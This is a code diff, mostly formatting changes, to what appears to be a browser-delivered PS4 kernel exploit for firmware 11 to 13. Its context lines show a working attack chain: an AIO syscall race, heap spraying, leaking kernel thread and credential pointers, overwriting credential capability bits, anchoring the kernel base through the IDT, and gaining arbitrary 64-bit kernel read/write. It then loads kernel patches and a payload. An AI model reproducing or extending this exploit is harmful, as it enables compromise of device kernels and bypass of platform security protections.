@@ -18,11 +18,11 @@ function post(tag, detail) {
     x.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
     x.send(
       "PS4-JB&tag=" +
-        encodeURIComponent(tag) +
-        "&detail=" +
-        encodeURIComponent(String(detail == null ? "" : detail)),
+      encodeURIComponent(tag) +
+      "&detail=" +
+      encodeURIComponent(String(detail == null ? "" : detail)),
     );
-  } catch (e) {}
+  } catch (e) { }
 }
 
 const VERBOSE = params.get("verbose") === "1";
@@ -177,19 +177,19 @@ let allDone = false,
         "kernel-table-present",
         missing.length === 0,
         "fw=" +
-          fwKey +
-          " missing=[" +
-          missing.join(",") +
-          "]" +
-          " -- dump this firmware with kdump5.html and derive its table" +
-          " with tools/kderive.py; stage=pre_primitive",
+        fwKey +
+        " missing=[" +
+        missing.join(",") +
+        "]" +
+        " -- dump this firmware with kdump5.html and derive its table" +
+        " with tools/kderive.py; stage=pre_primitive",
       )
     )
       return;
 
     const KPATCH_FILE =
       "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
-    const PAYLOAD_FILE = off.payload || "payload.bin";
+    const PAYLOAD_FILE = off.payload || "fw_11_to_13_payload.bin";
     const needPatch = ["k_sysent_661", "k_jmp_rsi"].filter(
       (k) => off[k] === undefined,
     );
@@ -198,10 +198,10 @@ let allDone = false,
         "kpatch-table-present",
         !DO_PATCH || needPatch.length === 0,
         "missing=[" +
-          needPatch.join(",") +
-          "] blob=" +
-          KPATCH_FILE +
-          " -- build it from patches/<fw>.c, see patches/1300.c",
+        needPatch.join(",") +
+        "] blob=" +
+        KPATCH_FILE +
+        " -- build it from patches/<fw>.c, see patches/1300.c",
       )
     )
       return;
@@ -220,16 +220,16 @@ let allDone = false,
     mark(
       "FW-KTABLE",
       "idt_rsvd=0x" +
-        off.k_idt_rsvd.toString(16) +
-        " prison0=0x" +
-        off.k_prison0.toString(16) +
-        " rootvnode=0x" +
-        off.k_rootvnode.toString(16) +
-        " kpatch=" +
-        KPATCH_FILE +
-        " payload=" +
-        PAYLOAD_FILE +
-        " src=ps4_offsets.js",
+      off.k_idt_rsvd.toString(16) +
+      " prison0=0x" +
+      off.k_prison0.toString(16) +
+      " rootvnode=0x" +
+      off.k_rootvnode.toString(16) +
+      " kpatch=" +
+      KPATCH_FILE +
+      " payload=" +
+      PAYLOAD_FILE +
+      " src=ps4_offsets.js",
     );
 
     // ---- benign-miss auto-retry (reads only, before any kernel write) ----
@@ -256,7 +256,7 @@ let allDone = false,
     const clearRetry = () => {
       try {
         sessionStorage.removeItem(RETRY_KEY);
-      } catch (e) {}
+      } catch (e) { }
     };
     const retryBenign = (why) => {
       const n = retryCount();
@@ -269,21 +269,21 @@ let allDone = false,
       }
       try {
         sessionStorage.setItem(RETRY_KEY, String(n + 1));
-      } catch (e) {}
+      } catch (e) { }
       mark(
         "AUTO-RETRY",
         "why=" +
-          why +
-          " reload " +
-          (n + 1) +
-          "/" +
-          RETRY_MAX +
-          " (benign read miss, no kernel write yet)",
+        why +
+        " reload " +
+        (n + 1) +
+        "/" +
+        RETRY_MAX +
+        " (benign read miss, no kernel write yet)",
       );
       setTimeout(() => {
         try {
           location.reload();
-        } catch (e) {}
+        } catch (e) { }
       }, 400);
       return true;
     };
@@ -311,10 +311,10 @@ let allDone = false,
     mark(
       "PAIR-STATUS",
       "state=" +
-        pairStatus.state +
-        " promoted=" +
-        pairStatus.promoted +
-        "   (promotion off: the 137 MB stays pinned)",
+      pairStatus.state +
+      " promoted=" +
+      pairStatus.promoted +
+      "   (promotion off: the 137 MB stays pinned)",
     );
     mark("PRIMITIVE-OK", "");
 
@@ -573,9 +573,9 @@ let allDone = false,
           const timer =
             timeoutMs > 0
               ? setTimeout(function () {
-                  pending.delete(id);
-                  reject(new Error(name + ": timeout waiting for " + fname));
-                }, timeoutMs)
+                pending.delete(id);
+                reject(new Error(name + ": timeout waiting for " + fname));
+              }, timeoutMs)
               : null;
           pending.set(id, { resolve, reject, timer });
           wk.postMessage({ id: id, name: fname, args: args });
@@ -672,11 +672,11 @@ let allDone = false,
       "pr-two-workers-reach-kernel",
       w1pid > 0 && w2pid > 0,
       "w1 getpid=" +
-        w1pid +
-        " w2 getpid=" +
-        w2pid +
-        " main=" +
-        sc(SYS.getpid).i32,
+      w1pid +
+      " w2 getpid=" +
+      w2pid +
+      " main=" +
+      sc(SYS.getpid).i32,
     );
 
     const mr = sc(
@@ -805,11 +805,11 @@ let allDone = false,
     mark(
       "PIN-AVAIL",
       "rv=" +
-        affGot +
-        " mask=0x" +
-        savedMask.toString(16) +
-        " cores=" +
-        cores.join(","),
+      affGot +
+      " mask=0x" +
+      savedMask.toString(16) +
+      " cores=" +
+      cores.join(","),
     );
     if (
       !check(
@@ -845,21 +845,21 @@ let allDone = false,
     mark(
       "PIN-SET",
       "core=" +
-        PINCORE +
-        " rv=" +
-        affSet +
-        " reads back 0x" +
-        backMask.toString(16),
+      PINCORE +
+      " rv=" +
+      affSet +
+      " reads back 0x" +
+      backMask.toString(16),
     );
     if (
       !check(
         "MAIN-PINNED",
         affSet === 0 && backMask === (1 << PINCORE) >>> 0,
         "core=" +
-          PINCORE +
-          " mask=0x" +
-          backMask.toString(16) +
-          " (free and malloc in armOnce now share one UMA per-cpu bucket)",
+        PINCORE +
+        " mask=0x" +
+        backMask.toString(16) +
+        " (free and malloc in armOnce now share one UMA per-cpu bucket)",
       )
     )
       return;
@@ -911,14 +911,14 @@ let allDone = false,
     mark(
       "PR-SATURATE",
       "rv=" +
-        sc(
-          SYS.aio_submit_cmd,
-          1 | 0x1000,
-          bufAddr(brqAb),
-          NBLOCK,
-          3,
-          bufAddr(bidAb),
-        ).i32,
+      sc(
+        SYS.aio_submit_cmd,
+        1 | 0x1000,
+        bufAddr(brqAb),
+        NBLOCK,
+        3,
+        bufAddr(bidAb),
+      ).i32,
     );
 
     const spAb = new ArrayBuffer(8);
@@ -961,9 +961,9 @@ let allDone = false,
     mark(
       "PR-TOWAIT",
       "aio_multi_wait timeout=" +
-        TOWAIT +
-        "us was=100000us" +
-        " deaths_in_that_sleep=all armings=4 exposure_was=400ms",
+      TOWAIT +
+      "us was=100000us" +
+      " deaths_in_that_sleep=all armings=4 exposure_was=400ms",
     );
     const POOL = [];
     for (let i = 0; i < SPRAY; i++) {
@@ -996,7 +996,7 @@ let allDone = false,
     function armOnce() {
       try {
         if (typeof A !== "undefined" && A) A.busy = 1;
-      } catch (e) {}
+      } catch (e) { }
 
       const g = armCount + 1;
       const at = function (t, d) {
@@ -1024,11 +1024,11 @@ let allDone = false,
       at(
         "ARM-P3-WAIT",
         "to=" +
-          TOWAIT +
-          "us submit=0 to_rb=" +
-          toDv.getUint32(0, true) +
-          " toad=" +
-          toAd,
+        TOWAIT +
+        "us submit=0 to_rb=" +
+        toDv.getUint32(0, true) +
+        " toad=" +
+        toAd,
       );
       const tw0 = Date.now();
       sc(SYS.aio_multi_wait, idAd2, 2, stAd2, 0, toAd);
@@ -1087,7 +1087,7 @@ let allDone = false,
       let pr = null;
       try {
         pr = w.fire(SYS.aio_multi_cancel, [idAd2, 1, stAd2]);
-      } catch (e) {}
+      } catch (e) { }
       for (let i = 0; i < SPIN; i++) {
         mU8[0x30 + (i & 15)] = i & 0xff;
         const hi1 = mU32[OWNER_HI];
@@ -1104,7 +1104,7 @@ let allDone = false,
             if (samples.length < 32)
               samples.push(
                 (hi1 >>> 0).toString(16).padStart(8, "0") +
-                  (lo >>> 0).toString(16).padStart(8, "0"),
+                (lo >>> 0).toString(16).padStart(8, "0"),
               );
             if (hits > 48) break;
           }
@@ -1117,20 +1117,20 @@ let allDone = false,
       mark(
         "PR-LEAK",
         w.name +
-          " hits=" +
-          hits +
-          " walked=" +
-          drop +
-          "/" +
-          N_LEAK +
-          " samples=" +
-          (keys.length
-            ? keys.map((k) => k + " x" + uniq[k]).join(" ")
-            : "none"),
+        " hits=" +
+        hits +
+        " walked=" +
+        drop +
+        "/" +
+        N_LEAK +
+        " samples=" +
+        (keys.length
+          ? keys.map((k) => k + " x" + uniq[k]).join(" ")
+          : "none"),
       );
       try {
         if (pr) await pr;
-      } catch (e) {}
+      } catch (e) { }
       if (!hits || hitHi >>> 0 < 0xffff0000 || keys.length !== 1) return null;
       return new int64(hitLo >>> 0, hitHi >>> 0);
     }
@@ -1152,9 +1152,9 @@ let allDone = false,
     mark(
       "PR-CURTHREADS",
       "w1=" +
-        CT1 +
-        " (w2 not leaked: one arming saved)" +
-        "  -- both workers are now PARKED and issue no further syscalls",
+      CT1 +
+      " (w2 not leaked: one arming saved)" +
+      "  -- both workers are now PARKED and issue no further syscalls",
     );
 
     let parkFail = "";
@@ -1185,10 +1185,10 @@ let allDone = false,
         parkFail === "",
         parkFail
           ? "rpc_worker.js has no spin():" +
-              parkFail +
-              " -- reload, nothing kernel has been touched yet"
+          parkFail +
+          " -- reload, nothing kernel has been touched yet"
           : "w1 cannot reach syscallenter again, so cred_update_thread can" +
-              " never crfree() the wild td_ucred passA is about to create",
+          " never crfree() the wild td_ucred passA is about to create",
       )
     )
       return;
@@ -1222,11 +1222,11 @@ let allDone = false,
     mark(
       "PR-ARENA",
       "nodes=" +
-        MAXN +
-        " bytes=0x" +
-        (NODE_SZ * MAXN).toString(16) +
-        " @" +
-        arAd,
+      MAXN +
+      " bytes=0x" +
+      (NODE_SZ * MAXN).toString(16) +
+      " @" +
+      arAd,
     );
 
     function wnode(i, decAddr, sinkAddr, last) {
@@ -1283,14 +1283,14 @@ let allDone = false,
       post(
         "REAP",
         tag +
-          " gen=" +
-          reapedGen +
-          " cancel=" +
-          c +
-          " poll=" +
-          p +
-          " delete=" +
-          d,
+        " gen=" +
+        reapedGen +
+        " cancel=" +
+        c +
+        " poll=" +
+        p +
+        " delete=" +
+        d,
       );
     }
 
@@ -1301,11 +1301,11 @@ let allDone = false,
       trace(
         "CH-MTX-PRE",
         label +
-          " owner=" +
-          (mU32[OWNER_HI] >>> 0).toString(16) +
-          ":" +
-          (mU32[OWNER_LO] >>> 0).toString(16) +
-          " want=0:4",
+        " owner=" +
+        (mU32[OWNER_HI] >>> 0).toString(16) +
+        ":" +
+        (mU32[OWNER_LO] >>> 0).toString(16) +
+        " want=0:4",
       );
       mU32[OWNER_LO] = 4;
       mU32[OWNER_HI] = 0;
@@ -1324,27 +1324,27 @@ let allDone = false,
       mark(
         "PR-FIRE",
         label +
-          " nodes=" +
-          nNodes +
-          " sink_moved=" +
-          moved +
-          " node0_sink=" +
-          n0 +
-          " f_socket=" +
-          w.idx +
-          " f_hits=" +
-          w.hits +
-          " state=0x" +
-          w.state.toString(16) +
-          " (" +
-          a +
-          ")",
+        " nodes=" +
+        nNodes +
+        " sink_moved=" +
+        moved +
+        " node0_sink=" +
+        n0 +
+        " f_socket=" +
+        w.idx +
+        " f_hits=" +
+        w.hits +
+        " state=0x" +
+        w.state.toString(16) +
+        " (" +
+        a +
+        ")",
       );
       if (n0 === 1 && w.idx < 0)
         mark(
           "PR-F-UNSEEN",
           "node0 fired but no pool socket carries the" +
-            " state write -- F went to something outside the pool",
+          " state write -- F went to something outside the pool",
         );
       reapNow("a=" + armCount);
       return moved;
@@ -1354,13 +1354,13 @@ let allDone = false,
     mark(
       "PR-PASSA-TARGET",
       "X1 = w1.curthread+0x130 (td_ucred) = " +
-        X1 +
-        "  KA=" +
-        KA +
-        " pair=0x" +
-        PAIR.toString(16) +
-        " covers up to " +
-        KA * PAIR,
+      X1 +
+      "  KA=" +
+      KA +
+      " pair=0x" +
+      PAIR.toString(16) +
+      " covers up to " +
+      KA * PAIR,
     );
     {
       let i = 0;
@@ -1380,13 +1380,13 @@ let allDone = false,
       mark(
         "PR-RESTOREA",
         "passA subtracted " +
-          KA * PAIR +
-          " sub=0x" +
-          subA.toString(16) +
-          " digits=" +
-          dA.join(",") +
-          " nodes=" +
-          nA,
+        KA * PAIR +
+        " sub=0x" +
+        subA.toString(16) +
+        " digits=" +
+        dA.join(",") +
+        " nodes=" +
+        nA,
       );
       if (!check("pr-restorea-bounded", nA >= 1 && nA <= 1020, "n=" + nA))
         return;
@@ -1402,8 +1402,8 @@ let allDone = false,
         mark(
           "PR-PASSA-NOCROSS",
           "no crossing: low dword either exceeds " +
-            KA * PAIR +
-            " or is already negative (top bit set)",
+          KA * PAIR +
+          " or is already negative (top bit set)",
         );
         if (retryBenign("passA-nocross")) return;
         check("POINTER-READ", false, "pass A found no crossing");
@@ -1413,14 +1413,14 @@ let allDone = false,
       mark(
         "PR-PASSA",
         "m=" +
-          mA +
-          " -> k=" +
-          kA +
-          "  W0 in (" +
-          (kA - 1) * PAIR +
-          ", " +
-          kA * PAIR +
-          "]",
+        mA +
+        " -> k=" +
+        kA +
+        "  W0 in (" +
+        (kA - 1) * PAIR +
+        ", " +
+        kA * PAIR +
+        "]",
       );
     }
 
@@ -1470,13 +1470,13 @@ let allDone = false,
       mark(
         "PR-RESTOREB",
         "passB subtracted " +
-          totB +
-          " sub=0x" +
-          subB.toString(16) +
-          " digits=" +
-          dB.join(",") +
-          " nodes=" +
-          nB,
+        totB +
+        " sub=0x" +
+        subB.toString(16) +
+        " digits=" +
+        dB.join(",") +
+        " nodes=" +
+        nB,
       );
 
       if (
@@ -1501,7 +1501,7 @@ let allDone = false,
         mark(
           "PR-PASSB-NOCROSS",
           "remainder never crossed -- k may be off" +
-            " by one, or the two threads' td_proc differ",
+          " by one, or the two threads' td_proc differ",
         );
         if (retryBenign("passB-nocross")) return;
         check("POINTER-READ", false, "pass B found no crossing");
@@ -1512,14 +1512,14 @@ let allDone = false,
       mark(
         "PR-PASSB",
         "m=" +
-          mB +
-          " -> R=" +
-          R +
-          "  => low dword = " +
-          W0 +
-          " (0x" +
-          (W0 >>> 0).toString(16) +
-          ")",
+        mB +
+        " -> R=" +
+        R +
+        "  => low dword = " +
+        W0 +
+        " (0x" +
+        (W0 >>> 0).toString(16) +
+        ")",
       );
     }
 
@@ -1527,19 +1527,19 @@ let allDone = false,
     mark(
       "PR-UCRED",
       "ucred = " +
-        UCRED +
-        "  (high dword taken from the leaked" +
-        " curthread prefix 0x" +
-        (CT1.hi >>> 0).toString(16) +
-        ")",
+      UCRED +
+      "  (high dword taken from the leaked" +
+      " curthread prefix 0x" +
+      (CT1.hi >>> 0).toString(16) +
+      ")",
     );
     check(
       "pointer-read-shape-ok",
       W0 >>> 0 !== 0 && ((W0 >>> 0) & 7) === 0,
       "low=0x" +
-        (W0 >>> 0).toString(16) +
-        " 8-byte aligned=" +
-        (((W0 >>> 0) & 7) === 0),
+      (W0 >>> 0).toString(16) +
+      " 8-byte aligned=" +
+      (((W0 >>> 0) & 7) === 0),
     );
     // Read phase is done: the remaining armings (anchor, caps) touch the
     // kernel, so from here a failure must NOT auto-reload. Reset the counter
@@ -1634,21 +1634,21 @@ let allDone = false,
     mark(
       "ANCHOR-PLAN",
       "idt=" +
-        IDT +
-        " rsvd_rva=0x" +
-        RVA_RSVD.toString(16) +
-        " jobs=" +
-        NJ +
-        " sweep=" +
-        SWEEP +
-        " nodes=" +
-        NEED +
-        " gates=" +
-        JOBS.map(function (q) {
-          return q.g;
-        }).join(",") +
-        " armings_so_far=" +
-        armCount,
+      IDT +
+      " rsvd_rva=0x" +
+      RVA_RSVD.toString(16) +
+      " jobs=" +
+      NJ +
+      " sweep=" +
+      SWEEP +
+      " nodes=" +
+      NEED +
+      " gates=" +
+      JOBS.map(function (q) {
+        return q.g;
+      }).join(",") +
+      " armings_so_far=" +
+      armCount,
     );
     if (
       !check(
@@ -1672,20 +1672,20 @@ let allDone = false,
           "anchor-inside-idt",
           lo >= 0 && hi < 0x1000,
           "lo=+0x" +
-            lo.toString(16) +
-            " hi=+0x" +
-            hi.toString(16) +
-            " limit=0x1000",
+          lo.toString(16) +
+          " hi=+0x" +
+          hi.toString(16) +
+          " limit=0x1000",
         )
       )
         return;
       mark(
         "ANCHOR-SPAN",
         "from=" +
-          IDT.add32(lo) +
-          " to=" +
-          IDT.add32(hi) +
-          " gates=15,20-27,31 reserved=1",
+        IDT.add32(lo) +
+        " to=" +
+        IDT.add32(hi) +
+        " gates=15,20-27,31 reserved=1",
       );
     }
 
@@ -1752,29 +1752,29 @@ let allDone = false,
       mark(
         "ANCHOR-BYTE",
         J.n +
-          " gate=" +
-          J.g +
-          " j=" +
-          J.j +
-          " low=0x" +
-          low.toString(16) +
-          " ones=" +
-          ones +
-          " edge=" +
-          edge +
-          " cands=" +
-          d.n +
-          " val=" +
-          (d.b < 0 ? "NO-MATCH" : "0x" + d.b.toString(16)),
+        " gate=" +
+        J.g +
+        " j=" +
+        J.j +
+        " low=0x" +
+        low.toString(16) +
+        " ones=" +
+        ones +
+        " edge=" +
+        edge +
+        " cands=" +
+        d.n +
+        " val=" +
+        (d.b < 0 ? "NO-MATCH" : "0x" + d.b.toString(16)),
       );
       if (J.want !== null)
         check(
           "anchor-control-" + J.n,
           d.b === J.want,
           "want=0x" +
-            J.want.toString(16) +
-            " got=" +
-            (d.b < 0 ? "none" : "0x" + d.b.toString(16)),
+          J.want.toString(16) +
+          " got=" +
+          (d.b < 0 ? "none" : "0x" + d.b.toString(16)),
         );
     }
     if (
@@ -1790,13 +1790,13 @@ let allDone = false,
       "anchor-duplicates-agree",
       B.b6 === B.b6d && B.b7 === B.b7d,
       "b6=0x" +
-        B.b6.toString(16) +
-        " b6d=0x" +
-        B.b6d.toString(16) +
-        " b7=0x" +
-        B.b7.toString(16) +
-        " b7d=0x" +
-        B.b7d.toString(16),
+      B.b6.toString(16) +
+      " b6d=0x" +
+      B.b6d.toString(16) +
+      " b7=0x" +
+      B.b7.toString(16) +
+      " b7d=0x" +
+      B.b7d.toString(16),
     );
 
     const handlerLo =
@@ -1806,17 +1806,17 @@ let allDone = false,
     mark(
       "ANCHOR-HANDLER",
       "handler=0xffffffff" +
-        handlerLo.toString(16).padStart(8, "0") +
-        " rva=0x" +
-        RVA_RSVD.toString(16) +
-        " b7=0x" +
-        B.b7.toString(16) +
-        " b6=0x" +
-        B.b6.toString(16) +
-        " b1=0x" +
-        B.b1.toString(16) +
-        " b0=0x" +
-        B.b0.toString(16),
+      handlerLo.toString(16).padStart(8, "0") +
+      " rva=0x" +
+      RVA_RSVD.toString(16) +
+      " b7=0x" +
+      B.b7.toString(16) +
+      " b6=0x" +
+      B.b6.toString(16) +
+      " b1=0x" +
+      B.b1.toString(16) +
+      " b0=0x" +
+      B.b0.toString(16),
     );
 
     const kbAligned = (kbLo & 0x3fff) === 0;
@@ -1824,25 +1824,25 @@ let allDone = false,
       "ANCHOR-KERNEL-BASE",
       kbAligned,
       "kernel_base=" +
-        KBASE +
-        " aligned0x4000=" +
-        (kbAligned ? 1 : 0) +
-        " low=0x" +
-        kbLo.toString(16),
+      KBASE +
+      " aligned0x4000=" +
+      (kbAligned ? 1 : 0) +
+      " low=0x" +
+      kbLo.toString(16),
     );
     mark(
       "ANCHOR-VERDICT",
       "fw=" +
-        fwKey +
-        " kernel_base=" +
-        KBASE +
-        " armings=" +
-        armCount +
-        " curthread=" +
-        CT1 +
-        " verdict=" +
-        (kbAligned ? "ANCHORED" : "REJECTED") +
-        (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned"),
+      fwKey +
+      " kernel_base=" +
+      KBASE +
+      " armings=" +
+      armCount +
+      " curthread=" +
+      CT1 +
+      " verdict=" +
+      (kbAligned ? "ANCHORED" : "REJECTED") +
+      (kbAligned ? " next=kfile" : " reason=not_0x4000_aligned"),
     );
 
     if (!kbAligned) {
@@ -1922,16 +1922,16 @@ let allDone = false,
     mark(
       "CAPS-TARGET",
       "ucred=" +
-        UCRED +
-        " caps0=" +
-        UCRED.add32(0x60) +
-        " byte=" +
-        CAPS_B +
-        " probe=" +
-        CAPS_PR +
-        " want_bit=62" +
-        " target=0x" +
-        CAPS_TARGET.toString(16),
+      UCRED +
+      " caps0=" +
+      UCRED.add32(0x60) +
+      " byte=" +
+      CAPS_B +
+      " probe=" +
+      CAPS_PR +
+      " want_bit=62" +
+      " target=0x" +
+      CAPS_TARGET.toString(16),
     );
 
     const mf1 = multiFire(
@@ -1952,17 +1952,17 @@ let allDone = false,
     mark(
       "CAPS-BYTE",
       "b=" +
-        (cb.b < 0 ? "NO-MATCH" : "0x" + cb.b.toString(16)) +
-        " cands=" +
-        cb.n +
-        " true_in={0x" +
-        bLo.toString(16) +
-        ",0x" +
-        bHi.toString(16) +
-        "} bit62_lo=" +
-        (setLo ? 1 : 0) +
-        " bit62_hi=" +
-        (setHi ? 1 : 0),
+      (cb.b < 0 ? "NO-MATCH" : "0x" + cb.b.toString(16)) +
+      " cands=" +
+      cb.n +
+      " true_in={0x" +
+      bLo.toString(16) +
+      ",0x" +
+      bHi.toString(16) +
+      "} bit62_lo=" +
+      (setLo ? 1 : 0) +
+      " bit62_hi=" +
+      (setHi ? 1 : 0),
     );
     if (
       !check(
@@ -1996,18 +1996,18 @@ let allDone = false,
       mark(
         "CAPS-PLAN",
         "decrement " +
-          CAPS_B +
-          " by " +
-          dN +
-          " -> final in {" +
-          fin
-            .map(function (v) {
-              return "0x" + v.toString(16);
-            })
-            .join(",") +
-          "} all_bit62=" +
-          (allSet ? 1 : 0) +
-          " wraps=1",
+        CAPS_B +
+        " by " +
+        dN +
+        " -> final in {" +
+        fin
+          .map(function (v) {
+            return "0x" + v.toString(16);
+          })
+          .join(",") +
+        "} all_bit62=" +
+        (allSet ? 1 : 0) +
+        " wraps=1",
       );
       if (
         !check(
@@ -2026,16 +2026,16 @@ let allDone = false,
       mark(
         "MF-PLAN",
         label +
-          " jobs=" +
-          jobs.length +
-          " nodes=" +
-          need +
-          " kinds=" +
-          jobs
-            .map(function (j) {
-              return j.kind;
-            })
-            .join(","),
+        " jobs=" +
+        jobs.length +
+        " nodes=" +
+        need +
+        " kinds=" +
+        jobs
+          .map(function (j) {
+            return j.kind;
+          })
+          .join(","),
       );
       if (
         !check(
@@ -2152,26 +2152,26 @@ let allDone = false,
     mark(
       "KF-OIDNUM",
       "addr=" +
-        O_NUM +
-        " n=" +
-        ONUM_N +
-        " m=" +
-        on.m +
-        " v=" +
-        on.v +
-        " want=" +
-        KERN_FILE_NUM,
+      O_NUM +
+      " n=" +
+      ONUM_N +
+      " m=" +
+      on.m +
+      " v=" +
+      on.v +
+      " want=" +
+      KERN_FILE_NUM,
     );
     if (
       !check(
         "KF-ANCHOR-CONFIRMED",
         on.v === KERN_FILE_NUM,
         "oid_number=" +
-          on.v +
-          " want=" +
-          KERN_FILE_NUM +
-          " kernel_base=" +
-          KBASE,
+        on.v +
+        " want=" +
+        KERN_FILE_NUM +
+        " kernel_base=" +
+        KBASE,
       )
     )
       return;
@@ -2181,13 +2181,13 @@ let allDone = false,
     mark(
       "KF-RESTORE-PLAN",
       "cur=0x" +
-        curNum.toString(16) +
-        " digits=" +
-        pNum.d.join(",") +
-        " nodes=" +
-        pNum.n +
-        " clean=" +
-        (pNum.clean ? 1 : 0),
+      curNum.toString(16) +
+      " digits=" +
+      pNum.d.join(",") +
+      " nodes=" +
+      pNum.n +
+      " clean=" +
+      (pNum.clean ? 1 : 0),
     );
     if (
       !check(
@@ -2206,11 +2206,11 @@ let allDone = false,
       mark(
         "KF-WRITE",
         "restore_oid_number=" +
-          pNum.n +
-          " unhide=1 caps=" +
-          capsPend +
-          " total=" +
-          i,
+        pNum.n +
+        " unhide=1 caps=" +
+        capsPend +
+        " total=" +
+        i,
       );
       if (runChain(i, "restore+unhide+caps") === null) return;
       capsWrote = capsPend;
@@ -2218,11 +2218,11 @@ let allDone = false,
     mark(
       "CAPS-DONE",
       "wrote=" +
-        capsWrote +
-        " skip=" +
-        (capsSkip || "none") +
-        " armings=" +
-        armCount,
+      capsWrote +
+      " skip=" +
+      (capsSkip || "none") +
+      " armings=" +
+      armCount,
     );
 
     const after = kernFile(false, "after-unhide");
@@ -2238,15 +2238,15 @@ let allDone = false,
     mark(
       "KRW-OIDS",
       "A(1,27)=" +
-        A_OID +
-        " A2(1,28)=" +
-        A2_OID +
-        " B(1,7)=" +
-        B_OID +
-        " &B.arg1=" +
-        B_ARG1 +
-        " capsLive=" +
-        (capsLive ? 1 : 0),
+      A_OID +
+      " A2(1,28)=" +
+      A2_OID +
+      " B(1,7)=" +
+      B_OID +
+      " &B.arg1=" +
+      B_ARG1 +
+      " capsLive=" +
+      (capsLive ? 1 : 0),
     );
 
     function planLow(cur, tgt) {
@@ -2289,9 +2289,9 @@ let allDone = false,
     mark(
       "KRW-PLAN",
       "posA=" +
-        (posA ? posA.length : "REFUSED") +
-        " posA2=" +
-        (posA2 ? posA2.length : "REFUSED"),
+      (posA ? posA.length : "REFUSED") +
+      " posA2=" +
+      (posA2 ? posA2.length : "REFUSED"),
     );
     const planOk = capsLive && !!posA && !!posA2;
     if (
@@ -2301,11 +2301,11 @@ let allDone = false,
         planOk
           ? ""
           : "capsLive=" +
-              (capsLive ? 1 : 0) +
-              " posA=" +
-              (posA ? posA.length : "null") +
-              " posA2=" +
-              (posA2 ? posA2.length : "null"),
+          (capsLive ? 1 : 0) +
+          " posA=" +
+          (posA ? posA.length : "null") +
+          " posA2=" +
+          (posA2 ? posA2.length : "null"),
       )
     ) {
       allDone = true;
@@ -2323,12 +2323,12 @@ let allDone = false,
         mark(
           "KRW-FIRE",
           "nodes=" +
-            i +
-            " (3 unhide + " +
-            posA.length +
-            " A + " +
-            posA2.length +
-            " A2)",
+          i +
+          " (3 unhide + " +
+          posA.length +
+          " A + " +
+          posA2.length +
+          " A2)",
         );
         if (!check("krw-fire-bounded", i > 0 && i <= MAXN, "nodes=" + i)) {
           allDone = true;
@@ -2429,11 +2429,11 @@ let allDone = false,
           mark(
             "KRW-T4-WRITE32",
             "orig=" +
-              o4 +
-              " wrote=0x41424344 readback=0x" +
-              r4.toString(16) +
-              " restored=" +
-              b4,
+            o4 +
+            " wrote=0x41424344 readback=0x" +
+            r4.toString(16) +
+            " restored=" +
+            b4,
           );
           check(
             "krw-write32",
@@ -2456,40 +2456,40 @@ let allDone = false,
           mark(
             "KRW-T5-WRITE64",
             "orig=" +
-              o8 +
-              " wrote=" +
-              MAGIC8 +
-              " readback=" +
-              r8 +
-              " restored=" +
-              b8,
+            o8 +
+            " wrote=" +
+            MAGIC8 +
+            " readback=" +
+            r8 +
+            " restored=" +
+            b8,
           );
           check("krw-write64", t5ok, "readback=" + r8 + " restored=" + b8);
 
           mark(
             "KRW-VERDICT",
             "fw=" +
-              fwKey +
-              " kernel_base=" +
-              KBASE +
-              " read32=" +
-              (t1 === 27 ? 1 : 0) +
-              " read8=" +
-              (t2ok ? 1 : 0) +
-              " heap=" +
-              (t3 === uidNow ? 1 : 0) +
-              " write32=" +
-              (r4 === 0x41424344 ? 1 : 0) +
-              " write64=" +
-              (t5ok ? 1 : 0) +
-              " armings=" +
-              armCount +
-              "  ** full 64-bit arbitrary kernel R/W, syscall speed, 0 armings **",
+            fwKey +
+            " kernel_base=" +
+            KBASE +
+            " read32=" +
+            (t1 === 27 ? 1 : 0) +
+            " read8=" +
+            (t2ok ? 1 : 0) +
+            " heap=" +
+            (t3 === uidNow ? 1 : 0) +
+            " write32=" +
+            (r4 === 0x41424344 ? 1 : 0) +
+            " write64=" +
+            (t5ok ? 1 : 0) +
+            " armings=" +
+            armCount +
+            "  ** full 64-bit arbitrary kernel R/W, syscall speed, 0 armings **",
           );
           mark(
             "KRW-API",
             "read8/write8/kread32/kwrite32 ready -- drop into the" +
-              " lapse/poops jailbreak stages (sysent hijack -> kpatch -> payload)",
+            " lapse/poops jailbreak stages (sysent hijack -> kpatch -> payload)",
           );
 
           const krwOk =
@@ -2497,21 +2497,21 @@ let allDone = false,
           mark(
             "EG-GATE",
             "krwOk=" +
-              (krwOk ? 1 : 0) +
-              " jb=" +
-              (DO_JB ? 1 : 0) +
-              " patch=" +
-              (DO_PATCH ? 1 : 0) +
-              " payload=" +
-              (DO_PAYLOAD ? 1 : 0),
+            (krwOk ? 1 : 0) +
+            " jb=" +
+            (DO_JB ? 1 : 0) +
+            " patch=" +
+            (DO_PATCH ? 1 : 0) +
+            " payload=" +
+            (DO_PAYLOAD ? 1 : 0),
           );
           if (
             !check(
               "eg-krw-ok",
               krwOk,
               "krwOk=" +
-                (krwOk ? 1 : 0) +
-                " (endgame needs all 5 KRW self-tests to pass)",
+              (krwOk ? 1 : 0) +
+              " (endgame needs all 5 KRW self-tests to pass)",
             )
           ) {
             allDone = true;
@@ -2570,17 +2570,17 @@ let allDone = false,
                       (kpatchBlob[i + 3] << 8) |
                       (kpatchBlob[i + 4] << 16) |
                       (kpatchBlob[i + 5] << 24)) >>>
-                      0,
+                    0,
                   );
                 }
               mark(
                 "KPATCH-BLOB",
                 "file=" +
-                  KPATCH_FILE +
-                  " bytes=" +
-                  (kpatchBlob ? kpatchBlob.length : 0) +
-                  " sites=" +
-                  SITES.length,
+                KPATCH_FILE +
+                " bytes=" +
+                (kpatchBlob ? kpatchBlob.length : 0) +
+                " sites=" +
+                SITES.length,
               );
             }
             if (DO_PAYLOAD) {
@@ -2593,15 +2593,15 @@ let allDone = false,
               mark(
                 "PAYLOAD-BLOB",
                 "file=" +
-                  PAYLOAD_FILE +
-                  " bytes=" +
-                  (payloadBlob ? payloadBlob.length : 0) +
-                  " head=" +
-                  (payloadBlob
-                    ? payloadBlob[0] === 0xe9
-                      ? "e9-ok"
-                      : "NOT-e9"
-                    : "none"),
+                PAYLOAD_FILE +
+                " bytes=" +
+                (payloadBlob ? payloadBlob.length : 0) +
+                " head=" +
+                (payloadBlob
+                  ? payloadBlob[0] === 0xe9
+                    ? "e9-ok"
+                    : "NOT-e9"
+                  : "none"),
               );
             }
 
